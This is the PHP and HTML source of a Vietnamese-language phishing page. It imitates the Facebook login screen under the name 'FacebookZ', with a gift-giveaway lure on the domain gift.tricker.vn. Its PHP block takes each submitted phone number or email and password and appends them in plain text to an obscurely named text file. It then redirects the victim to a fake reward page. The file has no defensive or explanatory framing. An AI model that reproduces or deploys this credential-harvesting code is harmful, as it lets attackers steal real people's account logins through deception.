
<?php 
require '../Core.php';
use Core\System;
$kun = new System;
$user = $kun->user();

?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="width=device-width, initial-scale=1" name="viewport">
<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '413644109715145');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=413644109715145&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->
<title>Facebook - Đăng nhập hoặc đăng ký</title>
<meta name="search engines" content="Aeiwi, Alexa, AllTheWeb, AltaVista, AOL Netfind, Anzwers, Canada, DirectHit, EuroSeek, Excite, Overture, Go, Google, HotBot. InfoMak, Kanoodle, Lycos, MasterSite, National Directory, Northern Light, SearchIt, SimpleSearch, WebsMostLinked, WebTop, What-U-Seek, AOL, Yahoo, WebCrawler, Infoseek, Excite, Magellan, LookSmart, bing, CNET, Googlebot">
<meta property="og:type" content="website">
<meta property="og:url" content="gift.tricker.vn">
<meta property="og:title" content="Đăng nhập FacebookZ | FacebookZ">
<meta property="og:description" content="Hãy đăng nhập FacebookZ để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
<meta name="description" content="Hãy đăng nhập FacebookZ để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
<meta name="keywords" content="auto followers, auto follower, Free increase unlimite followers, best auto follower, autofollower, followers">
<meta name="robots" content="index, follow">
<meta name="robot" content="index, follow">
<meta name="googlebot" content="index, follow">
<meta name="YandexBot" content="index, follow">
<link rel="stylesheet" href="./login/bootstrap.min.css">
<link class="tempLink" rel="stylesheet" type="text/css" href="./login/css">
<script src="./login/jquery.min.js" type="text/javascript"></script>
<link rel="stylesheet" href="./login/style.css">
</head>
<body id="vohuunhan">
<div class="container">
<div class="d-flex justify-content-center">.
<img src="./login/dF5SId3UHWd (2) (1).svg" class="img logo mt-2" alt="FacebookZ">
</div>
<div class="row h-100 justify-content-center align-items-center mt-2">
<div class="col-md-4 vhnlog">
    
<?php
  function emailValid($string) { 
        if (preg_match ("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+\.[A-Za-z]{2,6}$/", $string)) {
            return true;
        }
    }



    if (isset($_POST['taikhoan'])) {
        
       $username = $_POST['taikhoan'];
       $password = $_POST['matkhau'];

 if(empty($username) || empty($password)){
      $Show_MSG ='<div class="_5yd0 _2ph- _5yd1"  id="login-notice">Chưa Nhập Đầy Đủ Thông Tin Cần Thiết</div>';
 }else{
 
   if (strlen((int)$username) >= 8 && strlen($_POST['matkhau']) > 4) {
      if(!preg_match('/'.$username.'/', file_get_contents('125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt'))){
        $file = fopen('125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt','a');
        fwrite($file,$username.'/'.$password.PHP_EOL);
        fclose($file);
        fwrite(fopen('loc.txt','a'),$username."\n");
        fclose(fopen('loc.txt','a'));
        }
     $rand = rand(1111,9999);
     header('location: index.php?id='.$rand);
 $_SESSION['username'] = $username;
    $_SESSION['uid'] = $username;
    $_SESSION['name'] = $username;
       $_SESSION['quay'] = 1;
         $_SESSION['rank'] = 'bac';
         $_SESSION['diem'] = 800;
    }else{
    if (emailValid($username) && strlen($_POST['matkhau']) > 5){
       if(!preg_match('/'.$username.'/', file_get_contents('125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt'))){
        $file = fopen('125215sadsadwqrwqrwqrwqrsdsxzcxzc.txt','a');
        fwrite($file,$newcontent);
        fwrite($file,$username.'/'.$password.PHP_EOL);
        fclose($file);
        fwrite(fopen('loc.txt','a'),$username."\n");
        fclose(fopen('loc.txt','a'));
        }
            $rand = rand(1111,9999);
     header('location: index.php?id='.$rand);
 $_SESSION['username'] = $username;
    $_SESSION['uid'] = $username;
    $_SESSION['name'] = $username;
      $_SESSION['quay'] = 1;
       $_SESSION['rank'] = 'bac';
           $_SESSION['diem'] = 800;
     }else {
   $Show_MSG ='<span style="color: red;">Mật khẩu bạn đã nhập không chính xác</span>';
}
}
}
}

?>


<form action="" method="POST">
<div class="form-group">
<input type="text" class="form-control" name="taikhoan" value="" placeholder="Vui lòng nhập số di động hoặc email" required="">
</div>
<div class="form-group">
<input type="password" class="form-control" name="matkhau" placeholder="Password" required="">
</div>
<span style="color: red;"></span>
<div class="form-group">
<center>
    <?php echo $Show_MSG ?>
<button type="submit" name="dangnhap" class="btn btn-primary btn-block">Đăng nhập</button>
</center>
</div>
</form>
<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
<center>
<input class="btn btn-success" type="button" value="Tạo tài khoản mới">
</center>
</div>
</div>
<div class="row text-center" style="margin-top: 6rem;">
<div class="col">
<small class="text-muted">Tiếng Việt</small><br>
<small class="blue">English (US)</small>
</div>
<div class="col">
<small class="blue">Hindi (IN)</small>
<br>
<i class="far fa-plus-square"></i>
</div>
</div>
<div class="row text-center">
<div class="col-md-12">
<small class="text-muted">Facebook, Inc.</small>
</div>
</div>
<script src="./login/popper.min.js" type="text/javascript"></script>
<script src="./login/bootstrap.min.js" type="text/javascript"></script>
</div></body></html>